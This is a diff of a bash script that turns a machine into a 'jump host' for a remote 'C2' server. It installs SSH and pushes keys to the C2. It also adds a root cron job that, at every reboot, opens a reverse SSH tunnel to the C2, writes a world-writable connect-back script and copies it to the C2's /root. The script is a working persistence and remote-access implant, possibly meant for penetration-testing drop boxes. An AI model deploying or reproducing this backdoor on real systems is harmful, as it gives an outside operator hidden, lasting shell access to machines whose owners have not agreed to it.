@@ -8,9 +8,9 @@ if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
 
 #Installing deps
     echo "### Installing Dependencies ###"
-#    sudo apt update && sudo apt upgrade
-#    sudo apt install openssh-server
-#    printf "\n"
+    sudo apt update && sudo apt upgrade
+    sudo apt install openssh-server
+    printf "\n"
 
 #Starting openssh as a service
     echo "### Checking For SSH Status ### "
@@ -43,18 +43,18 @@ if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
     read C2
     printf "\n"
 
-#Transfering local key to C2
+#transfer local key to C2
     echo "### Copying Key To C2 Host ###"
     ssh-copy-id $C2
     printf "\n"
 
-#Generating a remote ssh key
+#generating a remote ssh key
    ssh $C2 'ssh-keygen'
 
 #Setup cron job
     echo "### Setting Up Cronjob ###"
     sudo crontab -l > cronsh
-    echo "@reboot sleep 200 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2}" >> cronsh
+    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2} && sudo -u ${user} printf 'ssh ${user}@localhost -p 43022' > /home/${user}/hmu.sh && chmod 777 /home/${user}/hmu.sh && sudo -u ${user} scp /home/${user}/hmu.sh ${C2}:/root" >> cronsh
     sudo crontab cronsh
     rm cronsh
     printf "\n"
@@ -63,8 +63,7 @@ if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
     printf "\n"
 
     echo "### Please Reboot the Jump Host ###"
-    
-#Uncomment the next line if you'd like the tunnel to start immediately.
+
     #Set up reverse tunnel
 #    sudo -u $user /usr/bin/tmux send-keys -t ssh "ssh -R 43022:localhost:22 ${varname}" enter
 
